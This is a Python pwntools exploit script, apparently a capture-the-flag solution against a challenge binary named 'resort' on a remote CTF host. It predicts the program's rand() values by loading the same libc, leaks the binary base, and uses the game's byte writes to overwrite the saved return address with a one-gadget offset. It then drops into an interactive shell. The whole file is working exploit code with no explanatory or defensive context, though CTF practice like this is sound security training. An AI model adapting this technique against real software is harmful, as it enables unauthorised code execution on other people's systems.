from pwn import *
from icecream import ic
import ctypes

elf = exe = ELF("./resort_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

randing = ctypes.CDLL("./libc.so.6")

context.binary = exe
# context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("dicec.tf", 32030)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *main+461
# b *main+210
# b *main+275
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a, drop = True)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()

ru("@ ")
elf.address = int(ru(" ").strip(), 16)- 0x11e0
ic(hex(elf.address))

# ret addr = 109
# onegad = 0xebc81
# onegad_to_ret_addr = 0xc1ef1
# set rbp to elf.bss() + 0x70

def null(offset):
    nulled = False
    while not nulled:
        if randing.rand() % 4 == 3:
            sla(b'> ', str(offset))
            nulled = True
        else:
            randing.rand() % 256
            sla(b'> ', str(0))



def find_key_by_value(d, target):
    return next((k for k, v in d.items() if v == target), None)

def remove_by_value(d, target):
    keys_to_remove = [k for k, v in d.items() if v == target]
    for k in keys_to_remove:
        del d[k]

def subdict(d):
    global x
    while d != {}:
        # ic(x)
        x += 1
        if randing.rand() % 4 == 3:
            sla(b'> ', str(0))
        else:
            val = randing.rand() % 255
            if val in d.values():
                sla(b'> ', str(find_key_by_value(d, val)))
                remove_by_value(d, val)
            else:
                sla(b'> ', str(0))

def to_dict(n, v):
    return {n + i: (v >> (8 * i)) & 0xFF for i in range((v.bit_length() + 7) // 8)}

def win_game():
    null(1)
    null(2)
    null(3)


x = 0
null(101)
d = {}
d.update(to_dict(109, ~(0xc1ef1 - 0x10000) & 0xffffff))
d.update(to_dict(101, ~(elf.bss()+0x70-0x10101010101) & 0xffffffffffff))
subdict(d)

win_game()
ic(x)

io.interactive()
